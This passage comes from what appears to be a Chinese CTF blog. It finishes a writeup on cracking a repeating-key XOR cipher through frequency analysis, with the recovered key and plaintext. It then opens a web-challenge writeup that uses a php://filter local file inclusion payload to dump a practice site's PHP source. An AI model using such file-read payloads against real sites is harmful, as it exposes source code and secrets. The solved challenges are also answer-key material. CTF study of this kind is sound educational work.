class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calCorrelation</span><span class="params">(cpool)</span>:</span></span><br><span class="line">    <span class="string">'''传入字典，形如&#123;'e':2,'p':3&#125;</span></span><br><span class="line"><span class="string">        返回可能性，0~1,值越大可能性越大</span></span><br><span class="line"><span class="string">        (correlation between the decrypted column letter frequencies and</span></span><br><span class="line"><span class="string">        the relative letter frequencies for normal English text)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    frequencies = &#123;<span class="string">"e"</span>: <span class="number">0.12702</span>, <span class="string">"t"</span>: <span class="number">0.09056</span>, <span class="string">"a"</span>: <span class="number">0.08167</span>, <span class="string">"o"</span>: <span class="number">0.07507</span>, <span class="string">"i"</span>: <span class="number">0.06966</span>,</span><br><span class="line">                   <span class="string">"n"</span>: <span class="number">0.06749</span>, <span class="string">"s"</span>: <span class="number">0.06327</span>, <span class="string">"h"</span>: <span class="number">0.06094</span>, <span class="string">"r"</span>: <span class="number">0.05987</span>, <span class="string">"d"</span>: <span class="number">0.04253</span>,</span><br><span class="line">                   <span class="string">"l"</span>: <span class="number">0.04025</span>, <span class="string">"c"</span>: <span class="number">0.02782</span>, <span class="string">"u"</span>: <span class="number">0.02758</span>, <span class="string">"m"</span>: <span class="number">0.02406</span>, <span class="string">"w"</span>: <span class="number">0.02360</span>,</span><br><span class="line">                   <span class="string">"f"</span>: <span class="number">0.02228</span>, <span class="string">"g"</span>: <span class="number">0.02015</span>, <span class="string">"y"</span>: <span class="number">0.01974</span>, <span class="string">"p"</span>: <span class="number">0.01929</span>, <span class="string">"b"</span>: <span class="number">0.01492</span>,</span><br><span class="line">                   <span class="string">"v"</span>: <span class="number">0.00978</span>, <span class="string">"k"</span>: <span class="number">0.00772</span>, <span class="string">"j"</span>: <span class="number">0.00153</span>, <span class="string">"x"</span>: <span class="number">0.00150</span>, <span class="string">"q"</span>: <span class="number">0.00095</span>,</span><br><span class="line">                   <span class="string">"z"</span>: <span class="number">0.00074</span>&#125;</span><br><span class="line">    relative = <span class="number">0.0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    fpool = <span class="string">'etaoinshrdlcumwfgypbvkjxqz'</span></span><br><span class="line">    total = sum(cpool.values())  <span class="comment"># 总和应包括字母和其他可见字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cpool.keys():</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> fpool:</span><br><span class="line">            relative += frequencies[i] * cpool[i] / total</span><br><span class="line">    <span class="keyword">return</span> relative</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyseFrequency</span><span class="params">(cfreq)</span>:</span></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> posFreq <span class="keyword">in</span> cfreq:</span><br><span class="line">        mostRelative = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> keyChr <span class="keyword">in</span> posFreq.keys():</span><br><span class="line">            r = calCorrelation(posFreq[keyChr])</span><br><span class="line">            <span class="keyword">if</span> r &gt; mostRelative:</span><br><span class="line">                mostRelative = r</span><br><span class="line">                keychar = keyChr</span><br><span class="line">        key.append(keychar)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key</span><br></pre></td></tr></table></figure><h4 id="根据密钥解密"><a href="#根据密钥解密" class="headerlink" title="根据密钥解密"></a>根据密钥解密</h4><p>求出密钥剩下的就好办了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vigenereDecrypt</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    plain = <span class="string">''</span></span><br><span class="line">    cur = <span class="number">0</span></span><br><span class="line">    ll = len(key)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">        plain += chr(c ^ key[cur])</span><br><span class="line">        cur = (cur + <span class="number">1</span>) % ll</span><br><span class="line">    <span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure><h3 id="一些数据"><a href="#一些数据" class="headerlink" title="一些数据"></a>一些数据</h3><h4 id="可能的密钥长度和对应字符集"><a href="#可能的密钥长度和对应字符集" class="headerlink" title="可能的密钥长度和对应字符集"></a>可能的密钥长度和对应字符集</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;7: </span><br><span class="line">[[162, 165, 168, 169, 170, 174, 175, 178, 179, 180, 184, 185, 186, 187, 189, 190, 191], </span><br><span class="line"></span><br><span class="line">[0, 2, 10, 11, 12, 17, 21, 23, 25, 26, 27, 28, 29, 30, 31, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95], </span><br><span class="line"></span><br><span class="line">[132, 133, 142, 144, 145, 146, 147, 148, 149, 150, 155, 159, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223], </span><br><span class="line"></span><br><span class="line">[161, 166, 167, 170, 173, 176, 177, 178, 179, 180, 181, 182, 183, 186, 188], </span><br><span class="line"></span><br><span class="line">[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 68, 70, 72, 76, 78, 80, 81, 82, 83, 84, 86, 87, 90, 93], </span><br><span class="line"></span><br><span class="line">[128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 195, 196, 200, 201, 202, 204, 205, 206, 207, 208, 210, 213, 216, 217, 223], </span><br><span class="line"></span><br><span class="line">[33, 39, 43, 44, 52, 55, 57, 58, 59, 60, 61, 62, 63]</span><br><span class="line">]&#125;</span><br></pre></td></tr></table></figure><h4 id="最后结果"><a href="#最后结果" class="headerlink" title="最后结果"></a>最后结果</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[186, 31, 145, 178, 83, 205, 62] Cryptography is the practice and study of techniques for, among other things, secure communication in the presence of attackers. Cryptography has been used for hundreds, if not thousands, of years, but traditional cryptosystems were designed and evaluated in a fairly ad hoc manner. For example, the Vigenere encryption scheme was thought to be secure for decades after it was invented, but we now know, and this exercise demonstrates, that it can be broken very easily.</span><br><span class="line">[Finished in 2.2s]</span><br></pre></td></tr></table></figure><h3 id="解密代码全文"><a href="#解密代码全文" class="headerlink" title="解密代码全文"></a>解密代码全文</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipher</span><span class="params">(file=<span class="string">'code.txt'</span>)</span>:</span></span><br><span class="line">    <span class="string">'''从文件中读取十六进制串，返回十六进制数组</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    c = open(file).read()</span><br><span class="line">    codeintlist = []</span><br><span class="line">    codeintlist.extend(</span><br><span class="line">        (map(<span class="keyword">lambda</span> i: int(c[i:i + <span class="number">2</span>], <span class="number">16</span>), range(<span class="number">0</span>, len(c), <span class="number">2</span>))))</span><br><span class="line">    <span class="keyword">return</span> codeintlist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKeyPool</span><span class="params">(cipher, stepSet, plainSet, keySet)</span>:</span></span><br><span class="line">    <span class="string">''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33]</span></span><br><span class="line"><span class="string">        返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。</span></span><br><span class="line"><span class="string">            形如&#123;</span></span><br><span class="line"><span class="string">                    1:[[0x11]],</span></span><br><span class="line"><span class="string">                    3:[</span></span><br><span class="line"><span class="string">                        [0x11,0x33,0x46],</span></span><br><span class="line"><span class="string">                        [0x22,0x58],</span></span><br><span class="line"><span class="string">                        [0x33]</span></span><br><span class="line"><span class="string">                       ]</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    keyPool = dict()</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> stepSet:</span><br><span class="line">        maybe = [<span class="keyword">None</span>] * step</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> xrange(step):</span><br><span class="line">            maybe[pos] = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> keySet:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> cipher[pos::step]:</span><br><span class="line">                    <span class="keyword">if</span> c ^ k <span class="keyword">not</span> <span class="keyword">in</span> plainSet:</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    maybe[pos].append(k)</span><br><span class="line">        <span class="keyword">for</span> posPool <span class="keyword">in</span> maybe:</span><br><span class="line">            <span class="keyword">if</span> len(posPool) == <span class="number">0</span>:</span><br><span class="line">                maybe = []</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(maybe) != <span class="number">0</span>:</span><br><span class="line">            keyPool[step] = maybe</span><br><span class="line">    <span class="keyword">return</span> keyPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calCorrelation</span><span class="params">(cpool)</span>:</span></span><br><span class="line">    <span class="string">'''传入字典，形如&#123;'e':2,'p':3&#125;</span></span><br><span class="line"><span class="string">        返回可能性，0~1,值越大可能性越大</span></span><br><span class="line"><span class="string">        (correlation between the decrypted column letter frequencies and</span></span><br><span class="line"><span class="string">        the relative letter frequencies for normal English text)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    frequencies = &#123;<span class="string">"e"</span>: <span class="number">0.12702</span>, <span class="string">"t"</span>: <span class="number">0.09056</span>, <span class="string">"a"</span>: <span class="number">0.08167</span>, <span class="string">"o"</span>: <span class="number">0.07507</span>, <span class="string">"i"</span>: <span class="number">0.06966</span>,</span><br><span class="line">                   <span class="string">"n"</span>: <span class="number">0.06749</span>, <span class="string">"s"</span>: <span class="number">0.06327</span>, <span class="string">"h"</span>: <span class="number">0.06094</span>, <span class="string">"r"</span>: <span class="number">0.05987</span>, <span class="string">"d"</span>: <span class="number">0.04253</span>,</span><br><span class="line">                   <span class="string">"l"</span>: <span class="number">0.04025</span>, <span class="string">"c"</span>: <span class="number">0.02782</span>, <span class="string">"u"</span>: <span class="number">0.02758</span>, <span class="string">"m"</span>: <span class="number">0.02406</span>, <span class="string">"w"</span>: <span class="number">0.02360</span>,</span><br><span class="line">                   <span class="string">"f"</span>: <span class="number">0.02228</span>, <span class="string">"g"</span>: <span class="number">0.02015</span>, <span class="string">"y"</span>: <span class="number">0.01974</span>, <span class="string">"p"</span>: <span class="number">0.01929</span>, <span class="string">"b"</span>: <span class="number">0.01492</span>,</span><br><span class="line">                   <span class="string">"v"</span>: <span class="number">0.00978</span>, <span class="string">"k"</span>: <span class="number">0.00772</span>, <span class="string">"j"</span>: <span class="number">0.00153</span>, <span class="string">"x"</span>: <span class="number">0.00150</span>, <span class="string">"q"</span>: <span class="number">0.00095</span>,</span><br><span class="line">                   <span class="string">"z"</span>: <span class="number">0.00074</span>&#125;</span><br><span class="line">    relative = <span class="number">0.0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    fpool = <span class="string">'etaoinshrdlcumwfgypbvkjxqz'</span></span><br><span class="line">    total = sum(cpool.values())  <span class="comment"># 总和应包括字母和其他可见字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cpool.keys():</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> fpool:</span><br><span class="line">            relative += frequencies[i] * cpool[i] / total</span><br><span class="line">    <span class="keyword">return</span> relative</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyseFrequency</span><span class="params">(cfreq)</span>:</span></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> posFreq <span class="keyword">in</span> cfreq:</span><br><span class="line">        mostRelative = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> keyChr <span class="keyword">in</span> posFreq.keys():</span><br><span class="line">            r = calCorrelation(posFreq[keyChr])</span><br><span class="line">            <span class="keyword">if</span> r &gt; mostRelative:</span><br><span class="line">                mostRelative = r</span><br><span class="line">                keychar = keyChr</span><br><span class="line">        key.append(keychar)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFrequency</span><span class="params">(cipher, keyPoolList)</span>:</span></span><br><span class="line">    <span class="string">''' 传入的密文作为数字列表处理</span></span><br><span class="line"><span class="string">        传入密钥的字符集应为列表，依次包含各字节字符集。</span></span><br><span class="line"><span class="string">            形如[[0x11,0x12],[0x22]]</span></span><br><span class="line"><span class="string">        返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频</span></span><br><span class="line"><span class="string">            形如[&#123;</span></span><br><span class="line"><span class="string">                    0x11:&#123;'a':2,'b':3&#125;,</span></span><br><span class="line"><span class="string">                    0x12:&#123;'e':6&#125;</span></span><br><span class="line"><span class="string">                 &#125;,</span></span><br><span class="line"><span class="string">                 &#123;</span></span><br><span class="line"><span class="string">                    0x22:&#123;'g':1&#125;</span></span><br><span class="line"><span class="string">                 &#125;]</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    freqList = []</span><br><span class="line">    keyLen = len(keyPoolList)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(keyLen):</span><br><span class="line">        posFreq = dict()</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> keyPoolList[i]:</span><br><span class="line">            posFreq[k] = dict()</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> cipher[i::keyLen]:</span><br><span class="line">                p = chr(k ^ c)</span><br><span class="line">                posFreq[k][p] = posFreq[k][p] + <span class="number">1</span> <span class="keyword">if</span> p <span class="keyword">in</span> posFreq[k] <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">        freqList.append(posFreq)</span><br><span class="line">    <span class="keyword">return</span> freqList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vigenereDecrypt</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    plain = <span class="string">''</span></span><br><span class="line">    cur = <span class="number">0</span></span><br><span class="line">    ll = len(key)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">        plain += chr(c ^ key[cur])</span><br><span class="line">        cur = (cur + <span class="number">1</span>) % ll</span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ps = []</span><br><span class="line">    ks = []</span><br><span class="line">    ss = []</span><br><span class="line">    ps.extend(xrange(<span class="number">32</span>, <span class="number">127</span>))</span><br><span class="line">    ks.extend(xrange(<span class="number">0xff</span> + <span class="number">1</span>))</span><br><span class="line">    ss.extend(xrange(<span class="number">1</span>, <span class="number">14</span>))</span><br><span class="line">    cipher = getCipher()</span><br><span class="line"></span><br><span class="line">    keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keyPool:</span><br><span class="line">        freq = getFrequency(cipher, keyPool[i])</span><br><span class="line">        key = analyseFrequency(freq)</span><br><span class="line">        plain = vigenereDecrypt(cipher, key)</span><br><span class="line">        <span class="keyword">print</span> key, plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="题目备份"><a href="#题目备份" class="headerlink" title="题目备份"></a>题目备份</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_LENGTH 2 <span class="comment">// Can be anything from 1 to 13</span></span></span><br><span class="line"></span><br><span class="line">main()&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> ch;</span><br><span class="line">  FILE *fpIn, *fpOut;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> key[KEY_LENGTH] = &#123;<span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">  <span class="comment">/* of course, I did not use the all-0s key to encrypt */</span></span><br><span class="line"></span><br><span class="line">  fpIn = fopen(<span class="string">"ptext.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  fpOut = fopen(<span class="string">"ctext.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line"></span><br><span class="line">  i=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fpIn, <span class="string">"%c"</span>, &amp;ch) != EOF) &#123;</span><br><span class="line">    <span class="comment">/* avoid encrypting newline characters */</span>  </span><br><span class="line">    <span class="comment">/* In a "real-world" implementation of the Vigenere cipher, </span></span><br><span class="line"><span class="comment">       every ASCII character in the plaintext would be encrypted.</span></span><br><span class="line"><span class="comment">       However, I want to avoid encrypting newlines here because </span></span><br><span class="line"><span class="comment">       it makes recovering the plaintext slightly more difficult... */</span></span><br><span class="line">    <span class="comment">/* ...and my goal is not to create "production-quality" code =) */</span></span><br><span class="line">    <span class="keyword">if</span> (ch!=<span class="string">'\n'</span>) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(fpOut, <span class="string">"%02X"</span>, ch ^ key[i % KEY_LENGTH]); <span class="comment">// ^ is logical XOR    </span></span><br><span class="line">      i++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  fclose(fpIn);</span><br><span class="line">  fclose(fpOut);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line">----------------------------------------------------------------------------------</span><br><span class="line">http:<span class="comment">//ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txt</span></span><br><span class="line"></span><br><span class="line">F96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Index_of_coincidence</a></li><li><a href="https://en.wikipedia.org/wiki/One-time_pad" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/One-time_pad</a></li><li><a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher</a></li><li><a href="https://en.wikipedia.org/wiki/Letter_frequency" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Letter_frequency</a></li><li><a href="https://www.lijinma.com/blog/2014/05/29/amazing-xor/" target="_blank" rel="noopener">https://www.lijinma.com/blog/2014/05/29/amazing-xor/</a></li><li><a href="http://blog.csdn.net/qq_31344951/article/details/77934717" target="_blank" rel="noopener">http://blog.csdn.net/qq_31344951/article/details/77934717</a></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>南邮CTF平台综合题2writeup</title>
      <link href="/171004NuptZonghe2WP/"/>
      <url>/171004NuptZonghe2WP/</url>
      
        <content type="html"><![CDATA[<blockquote><p>非xss题 但是欢迎留言~<br>地址：<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">get the flag</a></p></blockquote><h2 id="读取源码"><a href="#读取源码" class="headerlink" title="读取源码"></a>读取源码</h2><p>在页面底部发现一个这样的链接：<em><a href="http://cms.nuptzj.cn/about.php?file=sm.txt" target="_blank" rel="noopener">http://cms.nuptzj.cn/about.php?file=sm.txt</a></em> ，说明题目提供了读取文件功能，如果使用 <em><a href="http://php.net/manual/en/wrappers.file.php" target="_blank" rel="noopener">file://协议</a></em> 读取，HTML预留字符会以字符实体显示，看起来不方便，所以也可以编码读取后再本地解码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//cms.nuptzj.cn/about.php?file=php://filter/convert.base64-encode/resource=filename</span></span><br><span class="line">在拿到的文件里搜索 <span class="string">".php"</span> ，顺藤摸瓜，能找到并读取到的文件有：</span><br><span class="line">  sm.txt</span><br><span class="line">  about.php</span><br><span class="line">  index.php</span><br><span class="line">  passencode.php</span><br><span class="line">  say.php</span><br><span class="line">  antixss.php</span><br><span class="line">  so.php</span><br><span class="line">  preview.php</span><br><span class="line">  antiinject.php</span><br><span class="line">  -----------------------------</span><br><span class="line">  知道有 loginxlcteam目录或文件 和 config.php 但还读不到 ；还不知道有<span class="keyword">list</span>.php ,xlcteam.php</span><br></pre></td></tr></table></figure><h3 id="关于file-协议"><a href="#关于file-协议" class="headerlink" title="关于file://协议"></a>关于<em>file://协议</em></h3><p> <em>file://协议</em> (<a href="https://tools.ietf.org/html/rfc8089" target="_blank" rel="noopener">RFC8089</a> )是用来访问本地文件系统的，因为文件系统 是 PHP 使用的默认封装协议，因此在fopen()、 copy()、 file_exists() 、 file_get_contents()和 filesize() 等文件系统函数中是支持的。</p><p>在谷歌/火狐浏览器的URL框里输入  <em>file:///D:/</em>  或者在Linux命令行里敲 <em>lynx file:///</em> 都可以看到效果。</p><p><a href="http://php.net/manual/en/wrappers.file.php#refsect1-wrappers.file-usage" target="_blank" rel="noopener">PHP文档</a> 提供的用法如下：</p><blockquote><ul><li>/path/to/file.ext</li><li>relative/path/to/file.ext</li><li>fileInCwd.ext</li><li>C:/path/to/winfile.ext</li><li>C:\path\to\winfile.ext</li><li>\smbserver\share\path\to\winfile.ext</li><li>file:///path/to/file.ext</li></ul></blockquote><h3 id="关于PHP的过滤器-php-filter"><a href="#关于PHP的过滤器-php-filter" class="headerlink" title="关于PHP的过滤器(php://filter)"></a>关于PHP的过滤器(<em>php://filter</em>)</h3><p> <a href="http://php.net/manual/en/wrappers.php.php#wrappers.php.filter" target="_blank" rel="noopener">php://filter</a> 和 <a href="http://php.net/manual/en/filters.php" target="_blank" rel="noopener">可用的过滤器列表</a>。主要用在数据流内容读取之前做些筛选过滤，可指定过滤器应用在读模式还是写模式，不指定则两者都应用，也可复合使用多个过滤器，使用管道符隔开即可。</p><p>对于CTFer典型的用法像是这样：</p><blockquote><p>php://filter/read= &lt; filter list to apply to read chain &gt;/resource= &lt; stream to be filtered &gt;</p><p>php://filter/read=string.toupper|string.rot13/resource=<a 